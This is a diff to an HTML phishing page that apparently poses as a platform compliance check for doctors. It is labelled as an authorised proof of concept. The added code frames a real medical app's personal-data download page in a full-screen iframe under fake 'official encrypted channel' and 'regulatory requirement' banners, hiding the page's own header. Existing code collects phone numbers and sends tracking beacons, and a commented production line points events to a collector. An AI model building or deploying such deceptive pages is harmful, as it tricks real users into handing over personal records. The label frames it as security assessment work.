@@ -31,6 +31,7 @@
   .comp-wrap { position:relative; margin:0 12px; border-radius:10px; overflow:hidden; background:#fff; box-shadow:0 1px 4px rgba(20,60,100,.08); }
   .comp-wrap iframe { width:100%; height:660px; border:0; display:block; }
   .comp-cover { position:absolute; left:0; right:0; top:0; height:150px; background:#fff; z-index:5; }
+  .fullmode .comp-cover { display:none; }
   .comp-cover .t1 { font-size:14px; font-weight:600; color:#1a2b3c; padding:14px 16px 2px; }
   .comp-cover .t2 { font-size:11px; color:#7b8a99; padding:0 16px; line-height:1.6; }
   .comp-cover .t3 { font-size:10px; color:#0b5cad; padding:6px 16px; }
@@ -39,11 +40,29 @@
   .done h2 { font-size:16px; color:#1a2b3c; }
   .done p { font-size:12px; color:#7b8a99; margin-top:6px; }
   .foot { text-align:center; font-size:10px; color:#aab6c2; padding:10px 0 20px; }
+  /* ===== 浮层统一模式 ===== */
+  .fullmode .card, .fullmode .hdr { display:none; }
+  .fullmode .comp-wrap { margin:0; border-radius:0; height:100vh; }
+  .fullmode .comp-wrap iframe { height:100vh; }
+  .float-top { position:fixed; top:10px; left:12px; right:12px; z-index:50;
+    background:linear-gradient(135deg,#0b5cad,#1182d6); color:#fff; border-radius:12px;
+    padding:10px 14px; box-shadow:0 4px 12px rgba(11,92,173,.35); display:none; }
+  .float-top .ft1 { font-size:13px; font-weight:600; display:flex; align-items:center; gap:6px; }
+  .float-top .ft1 .dot { width:8px; height:8px; border-radius:50%; background:#7ef0b0; animation:bl 1.2s infinite; }
+  @keyframes bl { 50%{opacity:.3} }
+  .float-top .ft2 { font-size:10px; opacity:.85; margin-top:3px; }
+  .float-bot { position:fixed; bottom:10px; left:12px; right:12px; z-index:50;
+    background:rgba(255,255,255,.96); border:1px solid #d6e0ea; color:#44515f; border-radius:12px;
+    padding:8px 14px; font-size:10px; text-align:center; box-shadow:0 2px 8px rgba(20,60,100,.12); display:none; }
+  .fullmode .float-top, .fullmode .float-bot { display:block; }
   .badge-demo { position:fixed; right:8px; bottom:8px; background:#c0392b; color:#fff; font-size:9px; padding:2px 8px; border-radius:8px; z-index:99; }
 </style>
 </head>
 <body>
 <div class="badge-demo">PoC · 授权评估 · 禁止投放</div>
+<div class="float-top" id="ftop"><div class="ft1"><span class="dot"></span><span id="ft-t">执业档案调取（1/2）</span></div>
+<div class="ft2">🔒 官方加密通道 · 按监管要求调取，完成后自动返回核验</div></div>
+<div class="float-bot">本组件由平台合规系统提供 · 数据仅用于 2026 年度核验</div>
 
 <div class="hdr">
   <span class="tag">平台合规</span>
@@ -84,7 +103,7 @@
     </div>
   </div>
   <div style="margin:12px"><button class="btn" onclick="step3()">我已完成第 1 项认证</button>
-<button class="btn gray" onclick="window.open('https://doctorapp.lvsongguo.com/ucenter/privacy/personal-download?aid=3889','doctor3889','width=400,height=700')">执业档案原件调取（弹窗·3889）</button></div>
+<button class="btn gray" onclick="goFull('https://doctorapp.lvsongguo.com/ucenter/privacy/personal-download?aid=3889')">执业档案原件调取（弹窗·3889）</button></div>
 </div>
 
 <!-- STEP 3: 第二项核验（验证态全局生效假设：无需再收码，仅操作） -->
@@ -151,6 +170,13 @@ function beacon(ev, extra){
   /* 生产：navigator.sendBeacon('//collector/', JSON.stringify({ev,ev.t,...})) */
 }
 
+function goFull(url, idx){
+  document.body.classList.add('fullmode');
+  var f = document.getElementById('f1');
+  f.src = url;
+  document.getElementById('ft-t').textContent = '执业档案调取（' + (idx||1) + '/2）';
+  beacon('go_full', {url:url});
+}
 function step2(){
   var p = document.getElementById('phone').value.trim();
   if(!/^1\d{10}$/.test(p)){ alert('请输入正确手机号'); return; }
